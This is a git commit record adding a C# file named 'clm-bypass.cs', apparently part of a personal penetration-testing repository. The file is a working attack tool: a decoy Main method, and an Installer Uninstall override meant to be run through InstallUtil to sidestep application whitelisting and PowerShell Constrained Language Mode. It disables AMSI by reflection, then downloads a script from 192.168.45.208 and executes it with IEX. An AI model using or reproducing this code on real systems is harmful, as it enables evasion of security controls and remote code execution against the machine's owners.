5e527b53644ad4d0a2800bae4fc3631a6922af63
G00dspeed <cory.goodspeed@gmail.com>
2024-04-01 21:05:48 +0100

    Added some notes and a CS bypass

---
+++ clm-bypass.cs
@@ -0,0 +1,35 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "(([Ref].Assembly.gettypes() | ? {$_.Name -like \"Am*s\"}).GetFields(\"NonPublic,Static\") | ? {$_.Name -like \"am*ed\"}).SetValue($null,$true);(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/ref.txt') | IEX";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
